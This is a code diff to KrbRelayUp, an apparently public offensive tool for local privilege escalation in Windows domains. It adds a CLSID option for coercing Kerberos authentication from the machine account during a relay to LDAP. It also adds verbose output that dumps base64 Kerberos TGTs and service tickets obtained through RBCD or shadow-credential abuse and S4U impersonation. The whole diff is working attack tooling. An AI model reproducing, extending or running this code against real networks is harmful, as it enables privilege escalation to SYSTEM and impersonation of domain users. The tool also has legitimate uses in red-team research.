@@ -28,13 +28,14 @@ namespace KrbRelayUp
         public static bool useSSL = false;
         public static int ldapPort = 389;
         public static bool useCreateNetOnly = false;
-        //public static bool verbose = false;
+        public static bool verbose = false;
 
         // Relay Options
         public static Relay.Ldap.RelayAttackType relayAttackType = Relay.Ldap.RelayAttackType.RBCD;
         public static string relaySPN = null;
         public static string comServerPort = "12345";
         public static bool attackDone = false;
+        public static string clsid = "90f18417-f0f1-484e-9d3c-59dceee5dbd8";
 
         // RBCD Method
         public static bool rbcdCreateNewComputerAccount = false;
@@ -77,6 +78,7 @@ namespace KrbRelayUp
             Console.WriteLine("Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]\n");
             Console.WriteLine("    -m   (--Method)                   Abuse method to use in after a successful relay to LDAP <rbcd/shadowcred> (default=rbcd)");
             Console.WriteLine("    -p   (--Port)                     Port for Com Server (default=12345)");
+            Console.WriteLine("    -cls (--Clsid)                    CLSID to use for coercing Kerberos auth from local machine account (default=90f18417-f0f1-484e-9d3c-59dceee5dbd8)");
             Console.WriteLine("");
             Console.WriteLine("    # RBCD Method:");
             Console.WriteLine("    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.");
@@ -109,7 +111,7 @@ namespace KrbRelayUp
             Console.WriteLine("    -dc (--DomainController)         FQDN of domain controller. (Optional)");
             Console.WriteLine("    -ssl                             Use LDAP over SSL. (Optional)");
             Console.WriteLine("    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (enabled if using FULL mode)");
-            //Console.WriteLine("    -v  (--Verbose)                  Show verbose output. (Optional)");
+            Console.WriteLine("    -v  (--Verbose)                  Show verbose output. (Optional)");
 
             Console.WriteLine("\n");
             Console.WriteLine("KRBSCM: Will use the currently loaded Kerberos Service Ticket to create a new service running as SYSTEM.");
@@ -141,18 +143,19 @@ namespace KrbRelayUp
             int iDomainController = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(dc|DomainController)$").Match(s).Success);
             int iSSL = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(ssl)$").Match(s).Success);
             int iCreateNetOnly = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(n|CreateNetOnly)$").Match(s).Success);
-            //int iVerbose = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(v|Verbose)$").Match(s).Success);
+            int iVerbose = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(v|Verbose)$").Match(s).Success);
             Options.domain = (iDomain != -1) ? args[iDomain + 1] : Options.domain;
             Options.domainController = (iDomainController != -1) ? args[iDomainController + 1] : Options.domainController;
             Options.useSSL = (iSSL != -1) ? true : Options.useSSL;
             if (Options.useSSL)
                 Options.ldapPort = 636;
             Options.useCreateNetOnly = (iCreateNetOnly != -1) ? true : Options.useCreateNetOnly;
-            //Options.verbose = (iVerbose != -1) ? true : Options.verbose;
+            Options.verbose = (iVerbose != -1) ? true : Options.verbose;
 
             // Relay Options
             int iMethod = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(m|Method)$").Match(s).Success);
             int iComServerPort = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(p|Port)$").Match(s).Success);
+            int iClsid = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(cls|Clsid)$").Match(s).Success);
             if (iMethod != -1)
             {
                 if (!Enum.TryParse<Relay.Ldap.RelayAttackType>(args[iMethod + 1], true, out Options.relayAttackType))
@@ -163,6 +166,7 @@ namespace KrbRelayUp
                 }
             }
             Options.comServerPort = (iComServerPort != -1) ? args[iComServerPort + 1] : Options.comServerPort;
+            Options.clsid = (iClsid != -1) ? args[iClsid + 1] : Options.clsid;
 
             // RBCD Method
             int iCreateNewComputerAccount = Array.FindIndex(args, s => new Regex(@"(?i)(-|--)(c|CreateNewComputerAccount)$").Match(s).Success);
@@ -315,16 +319,31 @@ namespace KrbRelayUp
 
                     byte[] bInnerTGT = AskTGT.TGT($"{Options.rbcdComputerName}$", Options.domain, hash, eType, outfile: null, ptt: false);
                     KRB_CRED TGT = new KRB_CRED(bInnerTGT);
+                    if (Options.verbose)
+                        Console.WriteLine($"[+] VERBOSE: Base64 TGT for {Options.rbcdComputerName}$:\n    {Convert.ToBase64String(TGT.RawBytes)}\n");
 
                     KRB_CRED elevateTicket = S4U.S4U2Self(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: false);
+                    if (Options.verbose)
+                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.rbcdComputerName}$@{Options.domain}:\n    {Convert.ToBase64String(elevateTicket.Encode().Encode())}\n");
+
                     bFinalTicket = S4U.S4U2Proxy(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: (Options.phase != Options.PhaseType.Full), tgs: elevateTicket);
+                    if (Options.verbose)
+                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.targetSPN}:\n    {Convert.ToBase64String(bFinalTicket)}\n");
                 }
                 else if (Options.relayAttackType == Relay.Ldap.RelayAttackType.ShadowCred)
                 {
-                    byte[] bInnerTGT = AskTGT.TGT($"{Environment.MachineName}$", Options.domain, Options.shadowCredCertificate, Options.shadowCredCertificatePassword, Interop.KERB_ETYPE.aes256_cts_hmac_sha1, outfile: null, ptt: false);
+                    byte[] bInnerTGT = AskTGT.TGT($"{Environment.MachineName}$", Options.domain, Options.shadowCredCertificate, Options.shadowCredCertificatePassword, Interop.KERB_ETYPE.aes256_cts_hmac_sha1, outfile: null, ptt: false, getCredentials: Options.verbose);
                     KRB_CRED TGT = new KRB_CRED(bInnerTGT);
+                    if (Options.verbose)
+                        Console.WriteLine($"\n[+] VERBOSE: Base64 TGT for {Environment.MachineName}$:\n    {Convert.ToBase64String(TGT.RawBytes)}\n");
+
                     KRB_CRED elevateTicket = S4U.S4U2Self(TGT, Options.impersonateUser, Options.targetSPN, outfile: null, ptt: false);
+                    if (Options.verbose)
+                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.rbcdComputerName}$@{Options.domain}:\n    {Convert.ToBase64String(elevateTicket.Encode().Encode())}\n");
+
                     bFinalTicket = LSA.SubstituteTGSSname(elevateTicket, Options.targetSPN, ptt: (Options.phase != Options.PhaseType.Full));
+                    if (Options.verbose)
+                        Console.WriteLine($"[+] VERBOSE: Base64 TGS for {Options.impersonateUser} to {Options.targetSPN}:\n    {Convert.ToBase64String(bFinalTicket)}\n");
                 }
 
                 System.Threading.Thread.Sleep(1500);
